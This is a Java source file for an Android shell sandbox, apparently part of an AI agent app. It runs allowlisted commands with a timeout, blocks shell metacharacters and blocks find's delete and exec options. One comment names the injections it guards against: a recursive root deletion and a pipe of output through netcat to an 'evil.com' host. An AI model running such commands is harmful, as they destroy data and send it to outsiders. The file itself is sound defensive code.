package com.happyagent.mobile.tools;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import java.io.File;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

// Shell 沙箱：/system/bin/sh 跑白名单命令，带超时与 proot 探测。
// 只用 API 23 可用的无参 waitFor() + Future.get(timeout) + destroy()
public final class ShellExecutor {

    private static final String TAG = "ShellExecutor";
    private static final int MAX_OUTPUT = 64 * 1024;

    // 只允许这几类安全命令进沙箱执行，防注入
    private static final Set<String> ALLOWED = new HashSet<String>(Arrays.asList(
            "ls", "cat", "echo", "date", "uname", "whoami", "pwd", "id",
            "grep", "head", "tail", "wc", "stat", "find", "which"));

    private final Context ctx;

    // 共享线程池：所有 ShellExecutor 实例/每次 exec 复用同一个，不为每条命令新建 3 个线程
    private static final ExecutorService POOL = Executors.newFixedThreadPool(4);

    public ShellExecutor(Context context) {
        this.ctx = context.getApplicationContext();
    }

    // proot / Termux 环境探测
    public String detectProot() {
        StringBuilder sb = new StringBuilder();
        sb.append("Android ").append(Build.VERSION.RELEASE)
          .append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
        sb.append("设备: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
        String[] probes = {
                "/data/data/com.termux/files/usr/bin/proot-distro",
                "/data/data/com.termux/files/home/.proot-distro",
                "/system/bin/sh",
                "/system/bin/echo",
                ctx.getFilesDir() + "/workspace"
        };
        for (String p : probes) {
            File f = new File(p);
            sb.append(f.exists() ? "  [有] " : "  [无] ").append(p).append('\n');
        }
        return sb.toString();
    }

    // 跑一条命令，带超时。只接受白名单里的命令，且禁止元字符拼接（; & | ` $ < > 等）
    public String exec(String command, int timeoutMs) {
        if (command == null || command.trim().isEmpty()) return "empty command";
        String trimmed = command.trim();

        // 禁止 shell 元字符：防止 "ls; rm -rf /" 或 "ls | nc evil.com" 绕过
        if (trimmed.contains(";") || trimmed.contains("&") || trimmed.contains("|")
                || trimmed.contains("`") || trimmed.contains("$(") || trimmed.contains("(")
                || trimmed.contains(")") || trimmed.contains("<") || trimmed.contains(">")
                || trimmed.contains("\n") || trimmed.contains("\r")) {
            return "blocked: command contains shell metacharacters";
        }

        // 取第一个 token 做白名单校验
        int sp = trimmed.indexOf(' ');
        String cmd0 = sp > 0 ? trimmed.substring(0, sp).trim() : trimmed;
        cmd0 = cmd0.replaceAll("[^a-z]", "").toLowerCase();
        if (!ALLOWED.contains(cmd0)) {
            return "blocked: " + cmd0 + " not in allowlist";
        }
        // find 的 -delete/-exec/-execdir/-ok 能任意删文件/执行代码，禁掉
        if ("find".equals(cmd0) && (trimmed.contains("-delete") || trimmed.contains("-exec")
                || trimmed.contains("-execdir") || trimmed.contains("-ok"))) {
            return "blocked: find with -delete/-exec is not allowed";
        }

        Process proc;
        try {
            String[] argv = {"/system/bin/sh", "-c", trimmed};
            proc = Runtime.getRuntime().exec(argv);
        } catch (Exception e) {
            Log.e(TAG, "exec start failed", e);
            return "exec failed: " + e.getMessage() + "\n" + detectProot();
        }

        // 并发读 stdout/stderr + 并发等结束，丢共享池（不为每条命令新建线程）
        final Process p = proc;
        final Future<String> fOut = POOL.submit(() -> readLimited(p.getInputStream()));
        final Future<String> fErr = POOL.submit(() -> readLimited(p.getErrorStream()));
        final Future<Boolean> fDone = POOL.submit(new java.util.concurrent.Callable<Boolean>() {
            @Override
            public Boolean call() {
                try {
                    p.waitFor();   // 无参 waitFor 是 API 1
                    return Boolean.TRUE;
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return Boolean.FALSE;
                }
            }
        });

        boolean done;
        try {
            fDone.get(timeoutMs, TimeUnit.MILLISECONDS);
            done = true;
        } catch (Exception e) {
            // 超时（TimeoutException）或执行异常都按未完成处理
            done = false;
        }

        String stdout = safeGet(fOut, 5000);
        String stderr = safeGet(fErr, 5000);
        // 池不关（共享的），只把进程收尾
        if (!done) {
            p.destroy();   // API 1，无 destroyForcibly（那是 API 26）
            return "timeout after " + timeoutMs + "ms\n" + (stdout == null ? "" : stdout);
        }

        int code;
        try {
            code = p.exitValue();
        } catch (Exception e) {
            code = -1;
        }
        StringBuilder sb = new StringBuilder();
        sb.append("exit ").append(code).append('\n');
        if (stdout != null && !stdout.trim().isEmpty()) sb.append(stdout);
        if (stderr != null && !stderr.trim().isEmpty()) sb.append("stderr: ").append(stderr);
        return sb.toString();
    }

    private String safeGet(Future<String> f, int ms) {
        try {
            return f.get(ms, TimeUnit.MILLISECONDS);
        } catch (Exception e) {
            return "";
        }
    }

    // 读流带上限，避免输出撑爆内存
    private String readLimited(InputStream is) {
        try {
            byte[] buf = new byte[8192];
            StringBuilder sb = new StringBuilder();
            int n;
            while ((n = is.read(buf)) != -1) {
                sb.append(new String(buf, 0, n, StandardCharsets.UTF_8));
                if (sb.length() >= MAX_OUTPUT) {
                    while (is.read() != -1) {}   // 排空剩余，防管道积压
                    sb.append("\n... (truncated)");
                    break;
                }
            }
            is.close();
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
